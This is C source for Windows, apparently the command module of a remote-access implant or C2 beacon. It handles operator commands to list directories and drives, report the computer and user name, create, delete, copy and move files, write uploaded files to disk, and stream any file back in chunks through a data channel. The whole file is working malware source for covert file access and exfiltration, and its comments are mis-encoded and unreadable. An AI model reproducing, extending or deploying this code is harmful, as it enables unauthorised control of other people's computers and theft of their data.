#define _TIMESPEC_DEFINED  // ��ֹ windows.h �ظ����� timespec
#define WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "Command.h"
#include <iphlpapi.h>
#pragma warning(disable:4996)
#define PATH_MAX 4096
#define MAX_PATH_LENGTH 1048
#define MAX_TIME_STRING_LENGTH 50
extern unsigned char AESRandaeskey[16];
extern int Counter;

// ����������׷�ӵ� resultStr
#define APPEND_FMT(fmt, ...) do { \
        wchar_t temp[1024]; \
        int n = swprintf(temp, 1024, fmt, __VA_ARGS__); \
        if (n > 0) { \
            size_t needed = bufLen + n + 1; \
            if (needed > bufCap) { \
                bufCap = needed * 2; \
                resultStr = (wchar_t*)realloc(resultStr, bufCap * sizeof(wchar_t)); \
                if (!resultStr) { \
                    _findclose(handle); \
                    free(path); \
                    return NULL; \
                } \
            } \
            wcscpy(resultStr + bufLen, temp); \
            bufLen += n; \
        } \
    } while(0)

#define MAX_EXISTING_FILENAME 0x2000
#define MAX_NEW_FILENAME      0x2000

wchar_t* convertToWideChar(const char* input) {
    if (input == NULL) {
        return NULL;
    }
	// ��һ�ε��û�ȡ���軺������С
    int len = MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, NULL, 0);
    if (len == 0) {
        fprintf(stderr, "MultiByteToWideChar Failed With Error��%lu\n", GetLastError());
        return NULL;
    }

    wchar_t* wideStr = (wchar_t*)malloc(len * sizeof(wchar_t));
    if (wideStr == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (LPCCH)input, -1, wideStr, len) == 0) {
        fprintf(stderr, "MultiByteToWideChar Failed With Error��%lu\n", GetLastError());
        free(wideStr);
        return NULL;
    }

    return wideStr;
}

unsigned char* convertWideCharToUTF8(const wchar_t* wideStr) {
    if (!wideStr) {
        return NULL;
    }

    // ���� \0
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, NULL, 0, NULL, NULL);
    if (utf8Len == 0) {
        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    unsigned char* utf8Str = (unsigned char*)malloc(utf8Len);
    if (!utf8Str) {
		fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    if (WideCharToMultiByte(CP_UTF8, 0, wideStr, -1, utf8Str, utf8Len, NULL, NULL) == 0) {
        fprintf(stderr, "WideCharToMultiByte Failed With Error:%lu\n", GetLastError());
        free(utf8Str);
        return NULL;
    }

    return utf8Str;
}

/*
C:\Users\*
D    0    -    .
D    0    -    ..
D    0    2025/08/25 20:10:12    Documents
F    12345    2025/08/24 18:22:11    file.txt
*/

unsigned char* listDirectory(unsigned char* dirPathStr, size_t* dirPathStrLen) {
    if (!dirPathStr || !dirPathStrLen) {
        return NULL;
    }
    // ���ñ��ػ�����ҪӰ����ַ������ʱ���ʽ��
    setlocale(LC_ALL, "");
    wchar_t* path = convertToWideChar(dirPathStr);
    if (!path) {
		fprintf(stderr, "convertToWideChar failed\n");
        return NULL;
	}
    struct _wfinddata_t file_info;
    intptr_t handle;
    wchar_t search_path[MAX_PATH_LENGTH];
    size_t len = wcslen(path);

	// ȥ��·��ĩβ�� \ ���� /
    if (len > 0 && (path[len - 1] == L'/' || path[len - 1] == L'\\')) {
        path[len - 1] = L'\0';
    }

    // ƴ������ģʽ
    swprintf(search_path, MAX_PATH_LENGTH, L"%s\\*", path);

    // ���Դ�Ŀ¼�����ʧ�ܾ�Ĭ������ C:\*��
    handle = _wfindfirst(search_path, &file_info);
    if (handle == -1L) {
        free(path);
        fprintf(stderr, "Unable to open directory: %ls\n", path);
        return NULL;
    }

    // ��̬������
    size_t bufCap = 4096;
    size_t bufLen = 0;
    wchar_t* resultStr = (wchar_t*)malloc(bufCap * sizeof(wchar_t));
    if (!resultStr) {
        _findclose(handle);
        free(path);
        return NULL;
    }
    resultStr[0] = L'\0';

    // ����Ŀ¼·��
    APPEND_FMT(L"%s\n", search_path);

    // ǿ�Ƽ��� "." �� ".."
    APPEND_FMT(L"D\t0\t-\t.\n");
    APPEND_FMT(L"D\t0\t-\t..\n");

    wchar_t timeString[MAX_TIME_STRING_LENGTH];
	// ����Ŀ¼��
    do {
        if (wcscmp(file_info.name, L".") == 0 || wcscmp(file_info.name, L"..") == 0) {
            continue;
        }
        time_t modified_time = (time_t)file_info.time_write;
        struct tm* timeinfo = localtime(&modified_time);
        wcsftime(timeString, MAX_TIME_STRING_LENGTH, L"%Y/%m/%d %H:%M:%S", timeinfo);

        // Ŀ¼
        if (file_info.attrib & _A_SUBDIR) {
            APPEND_FMT(L"D\t0\t%s\t%s\n", timeString, file_info.name);
        }
        // �ļ�
        else {
            APPEND_FMT(L"F\t%lld\t%s\t%s\n", file_info.size, timeString, file_info.name);
        }
    } while (_wfindnext(handle, &file_info) == 0);

    _findclose(handle);
    free(path);

    // ת�� UTF-8
    unsigned char* resultStrchar = convertWideCharToUTF8(resultStr);
    free(resultStr);

    if (resultStrchar) {
        *dirPathStrLen = strlen(resultStrchar);
    }
    else {
        *dirPathStrLen = 0;
    }

    return resultStrchar;
}

unsigned char* CmdFileBrowse(unsigned char* commandBuf, size_t* msgLen) {
    uint8_t pendingRequest[4];
    uint8_t dirPathLengthBytes[4];

	// ���ݰ���ʽ�� pendingRequest(4Bytes) | dirPathLen(4Bytes) | dirPath(dirPathLen Bytes)
    memcpy(pendingRequest, commandBuf, 4);
    memcpy(dirPathLengthBytes, commandBuf + 4, 4);
    uint32_t dirPathLen = bigEndianUint32(dirPathLengthBytes);

    if (dirPathLen == 0) return NULL;

    unsigned char* dirPath = (unsigned char*)malloc(dirPathLen + 1);
    if(!dirPath) {
        fprintf(stderr, "Memory Allocation failed\n");
        return NULL;
	}
    unsigned char* dirPathStart = commandBuf + 8;

    memcpy(dirPath, dirPathStart, dirPathLen);
    dirPath[dirPathLen] = '\0';
    
    // ȥ�� * 
    // C:\foo\*bar �� C:\foo\bar
    unsigned char* tempPath = str_replace_all(dirPath, "*", "");
    free(dirPath);
    if (!tempPath) return NULL;

    unsigned char* dirPathStr = NULL;
    
    // �����״ν���CmdFileBrowse
    if (strncmp((char*)tempPath, ".\\", 2) == 0)
    {
        char cwd[PATH_MAX];
        if (getcwd(cwd, sizeof(cwd)) == NULL) {
            fprintf(stderr, "getcwd failed\n");
            return NULL;
        };
        // ��̬��������·��
        // �� 1 ����Ϊ��� Path Ϊ��
        size_t absLen = strlen(cwd) + 1; 
        dirPathStr = (unsigned char*)malloc(absLen + 1);
        if (!dirPathStr) {
            free(tempPath);
            return NULL;
        }
        snprintf((char*)dirPathStr, absLen + 1, "%s", cwd);
        free(tempPath);
    }
    // ���濪ʼ���� CmdFileBrowse
    else {
		// '/' -> '\'
        dirPathStr = str_replace_all(tempPath, "/", "\\");
        free(tempPath);
        if (!dirPathStr) return NULL;
    }

    // ��Ŀ¼
    size_t dirPathStrLen = 0;
    unsigned char* result = listDirectory(dirPathStr, &dirPathStrLen);
    free(dirPathStr);
    if (!result) return NULL;
    
    // ƴ����Ϣ
    uint8_t* metaInfoArrays[] = { pendingRequest, result };
    size_t metaInfoSizes[] = { 4, dirPathStrLen };
    size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
    size_t metaInfoTotalSize = 0;

    for (size_t i = 0; i < metaInfoCounts; ++i) {
        metaInfoTotalSize += metaInfoSizes[i];
    }

    *msgLen = metaInfoTotalSize;

    return metaInfoMsg;
}

unsigned char* CmdUpload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen, DWORD chunkNumber) {
    uint8_t fileNameLenBytes[4];

	// commandBuf ���ݽṹ����
	// fileNameLenBigEndian(4Bytes) | fileName(fileNameLenBigEndian Bytes) | fileContent(rest Bytes)
    unsigned char* fileNameLength = commandBuf;
    
    memcpy(fileNameLenBytes, fileNameLength, 4);

    uint32_t fileNameLenBigEndian = bigEndianUint32(fileNameLenBytes);
    unsigned char* fileName = (unsigned char*)malloc(fileNameLenBigEndian + 1);
    if(!fileName){
        fprintf(stderr, "Memory Allocation failed for fileName\n");
		return NULL;
    }
    fileName[fileNameLenBigEndian] = '\0';

    
    unsigned char* fileNameBuffer = commandBuf + 4;
    memcpy(fileName, fileNameBuffer, fileNameLenBigEndian);

    size_t fileContenthLen = commandBuflen - 4 - (size_t)fileNameLenBigEndian;
    unsigned char* fileContent = commandBuf + fileNameLenBigEndian + 4;

    unsigned char* buffer = (unsigned char*)malloc(1024);

    if (!buffer) {
        fprintf(stderr, "Memory Allocation failed for chunk\n");
        return NULL;
    }

    size_t bytesRead;
    size_t offset = 0;

    // ÿ��д�� 1KB
    while (offset < fileContenthLen) {
        size_t remaining = fileContenthLen - offset;
        size_t bufferSize = remaining > 1024 ? 1024 : remaining;

        memcpy(buffer, fileContent + offset, bufferSize);

        if (Upload(fileName, buffer, bufferSize, chunkNumber)) {
            offset += bufferSize;
            chunkNumber++;
        }
    }

    unsigned char* Uploadstr = "[+] Upload Successfully! File Size:";
    unsigned char offsetStr[20];     
    // ������ת��Ϊ�ַ���
	// size_t Ϊ long long ����ʹ��%lld
    sprintf(offsetStr, "%zu", offset);
    unsigned char* result = (unsigned char*)malloc(strlen(offsetStr) + strlen(Uploadstr) + 1);
    if (result) {
        memcpy(result, Uploadstr, strlen(Uploadstr));
        memcpy(result + strlen(Uploadstr), offsetStr, strlen(offsetStr));
        *msgLen = strlen(offsetStr) + strlen(Uploadstr);
    }
	result[*msgLen] = '\0';

    free(fileName);
    free(buffer);
    return result;
}

BOOL Upload(unsigned char* filePath, unsigned char* fileContent, size_t fileContentSize, int isStart) {
    FILE* file;
    const char* mode;
    
    if (isStart == 1) {
        // ����ļ��Ѵ��ڣ������ԭ�����ݣ��ļ����ȱ�Ϊ 0��
        // ����ļ������ڣ����½��ļ�
        // д��ʱ���ļ���ͷ��ʼд
        mode = "wb"; 
    }
    else {
        // ����ļ��Ѵ��ڣ�д���λ����Զ���ļ�ĩβ�����Ḳ��ǰ�������
        // ����ļ������ڣ����½��ļ�
        mode = "ab"; 
    }

    file = fopen(filePath, mode);
    if (file == NULL) {
        perror("File Open Error");
        return FALSE;
    }

    int bytesWritten = fwrite(fileContent, sizeof(unsigned char), fileContentSize, file);
    if (bytesWritten != fileContentSize) {
        perror("File Write Error");
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

unsigned char* CmdDrives(unsigned char* commandBuf, size_t* msgLen) {

    DWORD drives = GetLogicalDrives();
    unsigned char drivesStr[20];
    // ת��Ϊ�ַ���
    sprintf(drivesStr, "%d", drives);

    unsigned char* result = (unsigned char*)malloc(strlen(drivesStr) + 1);
    if (result) {
        memcpy(result, drivesStr, strlen(drivesStr));
        result[strlen(drivesStr)] = '\0';
        uint8_t command[4];
        memcpy(command, commandBuf, 4);

        uint8_t* metaInfoArrays[] = { command, result };
        size_t metaInfoSizes[] = { 4, strlen(result) };
        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
        size_t metaInfoTotalSize = 0;

        // �������� sizeof ����ֵ���ܺ�
        for (size_t i = 0; i < metaInfoCounts; ++i) {
            metaInfoTotalSize += metaInfoSizes[i];
        }
        *msgLen = metaInfoTotalSize;

        return metaInfoMsg;
    }
}

unsigned char* CmdPwd(unsigned char* commandBuf, size_t* msgLen) {
    // ��ȡ�����������С������'\0'
    DWORD bufferSize = GetCurrentDirectoryA(0, NULL); 

    if (bufferSize == 0) {
        unsigned char* error = "[-] Error Get Directory";
        unsigned char* errorBuffer = (unsigned char*)malloc(strlen(error) + 1);
        memcpy(errorBuffer, error, strlen(error));
        *msgLen = strlen(error);
        return errorBuffer;
    }

    unsigned char* lpcurrentPath = (unsigned char*)malloc(bufferSize + 1);

    // result ������'\0'
    DWORD resultLen = GetCurrentDirectoryA(bufferSize, lpcurrentPath);

    if (resultLen == 0 || resultLen > bufferSize) {
		fprintf(stderr, "GetCurrentDirectoryA Failed With Error:%lu", GetLastError());
        free(lpcurrentPath);
    }

    *msgLen = resultLen;
	lpcurrentPath[*msgLen] = '\0';

    return lpcurrentPath;
}

unsigned char* CmdGetUid(unsigned char* commandBuf, size_t* msgLen) {
    unsigned char* computerName = (unsigned char*)malloc(MAX_COMPUTERNAME_LENGTH);
    unsigned char* userName = (unsigned char*)malloc(UNLEN);

    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;

    if (!GetComputerNameA(computerName, &size)) {
        fprintf(stderr, "GetComputerNameA Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    size = UNLEN + 1;
    if (!GetUserNameA(userName, &size)) {
        fprintf(stderr, "GetUserNameA Failed With Error:%lu\n", GetLastError());
        return NULL;
    }

    if (computerName && userName) {
        size_t total_len = strlen(computerName) + strlen(userName) + 2; // ������'\0'
        unsigned char* result = malloc(total_len + 1);
        snprintf(result, total_len, "%s\\%s", computerName, userName);
        *msgLen = total_len;

		result[*msgLen] = '\0';
        return result;
    }
}

unsigned char* CmdMkdir(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    if (!CreateDirectoryA((LPCSTR)commandBuf, NULL) != 0) {
        fprintf(stderr, "CreateDirectoryA Failed With Error��%lu\n", GetLastError());
        return NULL;
    }

    unsigned char* Mkdirstr = "[+] Mkdir Success:";
    unsigned char* result = (unsigned char*)malloc(strlen(Mkdirstr) + commandBuflen + 1);
    if (result) {
        memcpy(result, Mkdirstr, strlen(Mkdirstr));
        memcpy(result + strlen(Mkdirstr), commandBuf, commandBuflen);

        *msgLen = strlen(Mkdirstr) + commandBuflen;

		result[*msgLen] = '\0';

        return result;
    }
}


unsigned char* CmdFileRemove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    DWORD attributes = GetFileAttributesA((LPCSTR)commandBuf);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "[-] Remove failed:Invalid path or file";
        *msgLen = strlen(errorMsg);
        unsigned char* result = (unsigned char*)malloc(strlen(errorMsg) + 1);
        if (!result) {
            fprintf(stderr, "Memory allocation failed\n");
			return NULL;
        }
        memcpy(result, errorMsg, strlen(errorMsg));
        return result;
    }

    int removeResult;
    // ɾ���ļ���Ŀ¼�����
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        removeResult = RemoveDirectoryA((LPCSTR)commandBuf);
    }
    // �ļ�
    else {
        removeResult = DeleteFileA((LPCSTR)commandBuf);
    }

    unsigned char* Removestr = removeResult == 0 ? "[-] Remove Failed:" : "[+] Remove Success:";
    size_t RemovestrLen = strlen(Removestr);

    *msgLen = RemovestrLen + commandBuflen;
    unsigned char* result = (unsigned char*)malloc(*msgLen + 1);
    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    memcpy(result, Removestr, RemovestrLen);
    memcpy(result + RemovestrLen, commandBuf, commandBuflen);
	result[*msgLen] = '\0';

    return result;
}

struct FileThreadArgs {
    unsigned char* fileNameBuf;
    size_t fileNameBufLen;
};

DWORD WINAPI myThreadFunction(LPVOID lpParam) {
    Sleep(2000);
    struct FileThreadArgs* args = (struct FileThreadArgs*)lpParam;
    unsigned char* fileNameBuf = args->fileNameBuf;
    size_t fileNameBufLen = args->fileNameBufLen;
    LPCSTR lpFilePath = (LPCSTR)fileNameBuf;
    uint64_t fileLen64Val;
    uint32_t fileLen32Val;

    WIN32_FILE_ATTRIBUTE_DATA fileInfo;
    if (GetFileAttributesExA(lpFilePath, GetFileExInfoStandard, &fileInfo)) {
        LARGE_INTEGER largeFileSize;
        largeFileSize.LowPart = fileInfo.nFileSizeLow;
        largeFileSize.HighPart = fileInfo.nFileSizeHigh;
        // 64 λ�ļ��ܴ�С
        fileLen64Val = largeFileSize.QuadPart;
        // ������� 4GB ���ļ�
		// ���򷵻ش�����Ϣ
        if (largeFileSize.QuadPart > UINT32_MAX) {
            unsigned char* errorStr = "[-] The downloaded file is larger than 4GB";
			unsigned char* errorBuffer = (unsigned char*)malloc(strlen(errorStr) + 1);
            if (errorBuffer) {
                memcpy(errorBuffer, errorStr, strlen(errorStr));
                errorBuffer[strlen(errorStr)] = '\0';
                DataProcess(errorBuffer, strlen(errorBuffer), 0);
                return FALSE;
            }
        }
		// �ļ���С�Ѿ��� 4GB ��Χ����, ����ֱ�Ӹ�ֵ
        fileLen32Val = (uint32_t)largeFileSize.QuadPart;
    }

    else {
        fprintf(stderr, "Failed to get file attributes:%lu\n", GetLastError());
        return FALSE;
    }

    // ��ʼ�������ݰ� 
    // ���ݰ���ʽ: responseIdBigEndian(4Bytes) | fileLen32BigEndian(4Bytes) | buf(fileLen32BigEndian Bytes)
    uint8_t fileLen32BigEndian[4];
    PutUint32BigEndian(fileLen32BigEndian, fileLen32Val);
    uint32_t requestId = (uint32_t)GenerateRandomInt(10000, 99999);
    uint8_t responseIdBigEndian[4];
    PutUint32BigEndian(responseIdBigEndian, requestId);
    uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileLen32BigEndian, fileNameBuf };
    size_t metaInfoSizes[] = { 4, 4, fileNameBufLen };
    size_t metaInfoCounts= sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
    uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
    size_t metaInfoTotalSize = 0;

    for (size_t i = 0; i < metaInfoCounts; ++i) {
        metaInfoTotalSize += metaInfoSizes[i];
    }

    DataProcess((unsigned char*)metaInfoMsg, metaInfoTotalSize, 2);

    HANDLE hFile = CreateFileA(fileNameBuf, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "CreateFileA Failed With Error:%lu\n", GetLastError());
        return FALSE;
    }

    // ������ 1MB
    unsigned char* fileBuffer = (unsigned char*)malloc(1024 * 1024); 
    if (fileBuffer == NULL) {
		fprintf(stderr, "Memory allocation failed\n");
        return FALSE;
    }

    DWORD bytesRead;
    // ���ݰ���ʽ: requestIdBigEndian(4Bytes) | fileBuffer
    while (TRUE) {
        BOOL bRead = ReadFile(hFile, fileBuffer, 1024 * 1024, &bytesRead, NULL);
        if (!bRead && GetLastError() != 0) {
            break;
        }
        // ���ݶ�ȡ����
        if (bytesRead == 0) {
            break;
        }
        uint8_t* metaInfoArrays[] = { responseIdBigEndian, fileBuffer };
        size_t metaInfoSizes[] = { 4, bytesRead };
        size_t metaInfoCounts = sizeof(metaInfoArrays) / sizeof(metaInfoArrays[0]);
        uint8_t* metaInfoMsg = CalcByte(metaInfoArrays, metaInfoSizes, metaInfoCounts);
        size_t metaInfoTotalSize = 4 + bytesRead;

        DataProcess(metaInfoMsg, metaInfoTotalSize, 8);
        Sleep(50);
    }

    unsigned char* downloadStr = "[+] Already Download file ";
    unsigned char* resultStr = (unsigned char*)malloc(strlen(downloadStr) + fileNameBufLen + 1);
    if (!resultStr) {
        fprintf(stderr, "Memory allocation failed for result\n");
        return FALSE;
    }
    memcpy(resultStr, downloadStr, strlen(downloadStr));
    memcpy(resultStr + strlen(downloadStr), args->fileNameBuf, fileNameBufLen);
    size_t msgLen = strlen(downloadStr) + fileNameBufLen;

    resultStr[msgLen] = '\0';

    DataProcess(resultStr, msgLen, 0);

    free(args->fileNameBuf);
    free(args);
    free(fileBuffer);

    return TRUE;
}

VOID CmdFileDownload(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    struct FileThreadArgs* args = (struct FileThreadArgs*)malloc(sizeof(struct FileThreadArgs));
    if (args == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        return;
    }

    args->fileNameBuf = (unsigned char*)malloc(commandBuflen + 1);
    if (args->fileNameBuf) {
        memcpy(args->fileNameBuf, commandBuf, commandBuflen);
        args->fileNameBuf[commandBuflen] = '\0';

        args->fileNameBufLen = commandBuflen;
    }

    DWORD attributes = GetFileAttributesA((LPCSTR)args->fileNameBuf);

    if (attributes == INVALID_FILE_ATTRIBUTES) {
        const char* errorMsg = "[-] GetFileAttributesA failed: Invalid path or file";
        unsigned char* errorStr = (unsigned char*)malloc(strlen(errorMsg) + 1);
        if (errorStr) {
            memcpy(errorStr, errorMsg, strlen(errorMsg));
            *msgLen = strlen(errorMsg);
			errorStr[strlen(errorMsg)] = '\0';
            DataProcess(errorStr, strlen(errorMsg), 0);
        }
    }

    // Ŀ¼
    if (attributes & FILE_ATTRIBUTE_DIRECTORY) {
        fprintf(stderr, "Unable to download directory\n");
        return;
    }

    HANDLE myThread = CreateThread(
        NULL,                       // Ĭ���̰߳�ȫ��
        0,                          // Ĭ�϶�ջ��С
        myThreadFunction,           // �̺߳���
        args,                       // ���ݸ��̺߳����Ĳ���
        0,                          // Ĭ�ϴ�����־
        NULL);                      // ���洢�߳�ID

    if (myThread == NULL) {
        fprintf(stderr, "CreateThread Failed With Error: %lu\n", GetLastError());
        return NULL;
    }

    CloseHandle(myThread);
}
unsigned char* CmdFileCopy(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    // ���ݰ���ʽ��existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
    uint8_t existingFileNameLength[4];
    memcpy(existingFileNameLength, commandBuf, 4);
    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);

    uint8_t newFileNameLength[4];
    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);

    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
    if (!existingFileName) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
    existingFileName[existingFileNameBigEndian] = '\0';

    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
    if (!newFileName) {
        fprintf(stderr, "Memory allocation failed\n");
        free(existingFileName);
        return NULL;
    }
    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
    newFileName[newFileNameBigEndian] = '\0';

    if (!CopyFileA(existingFileName, newFileName, FALSE))
    {
		fprintf(stderr, "CopyFileA Failed With Error:%lu\n", GetLastError());
        free(existingFileName);
        free(newFileName);
        return NULL;
    }

	unsigned char* copyStr = "[+] Copy Success:";
    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
	unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
	snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);

	*msgLen = strlen((char*)postMsg);

    free(existingFileName);
    free(newFileName);
    return postMsg;
}

unsigned char* CmdFileMove(unsigned char* commandBuf, size_t commandBuflen, size_t* msgLen) {
    // ���ݰ���ʽ��existingFileNameBigEndian(4Bytes) | existingFileName(existingFileNameBigEndian Bytes) | newFileNameLength(4Bytes) | newFileName(newFileNameLength Bytes)
    uint8_t existingFileNameLength[4];
    memcpy(existingFileNameLength, commandBuf, 4);
    uint32_t existingFileNameBigEndian = bigEndianUint32(existingFileNameLength);

    uint8_t newFileNameLength[4];
    memcpy(newFileNameLength, commandBuf + 4 + existingFileNameBigEndian, 4);
    uint32_t newFileNameBigEndian = bigEndianUint32(newFileNameLength);

    unsigned char* existingFileName = malloc(existingFileNameBigEndian + 1);
    if (!existingFileName) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }
    memcpy(existingFileName, commandBuf + 4, existingFileNameBigEndian);
    existingFileName[existingFileNameBigEndian] = '\0';

    unsigned char* newFileName = malloc(newFileNameBigEndian + 1);
    if (!newFileName) {
        fprintf(stderr, "Memory allocation failed\n");
        free(existingFileName);
        return NULL;
    }
    memcpy(newFileName, commandBuf + 4 + existingFileNameBigEndian + 4, newFileNameBigEndian);
    newFileName[newFileNameBigEndian] = '\0';

    if (!MoveFileA(existingFileName, newFileName))
    {
        fprintf(stderr, "MoveFileA Failed With Error:%lu\n", GetLastError());
        free(existingFileName);
        free(newFileName);
        return NULL;
    }

    unsigned char* copyStr = "[+] Move Success:";
    size_t postMsgLen = strlen(copyStr) + strlen(existingFileName) + strlen(" -> ") + strlen(newFileName) + 1;
    unsigned char* postMsg = (unsigned char*)malloc(postMsgLen);
    snprintf(postMsg, postMsgLen, "%s%s -> %s", copyStr, existingFileName, newFileName);

    *msgLen = strlen((char*)postMsg);

    free(existingFileName);
    free(newFileName);
    return postMsg;
}


